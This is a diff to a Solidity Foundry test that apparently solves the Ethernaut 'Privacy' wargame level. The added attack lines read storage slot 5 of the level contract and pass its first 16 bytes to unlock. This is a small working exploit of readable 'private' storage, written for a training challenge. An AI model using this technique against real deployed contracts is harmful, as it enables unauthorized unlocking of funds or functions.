@@ -29,13 +29,15 @@ contract PrivacyTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        bytes32 data = vm.load(address(ethernautPrivacy), bytes32(abi.encode(5)));
+
+        ethernautPrivacy.unlock(bytes16(data));
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
 
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
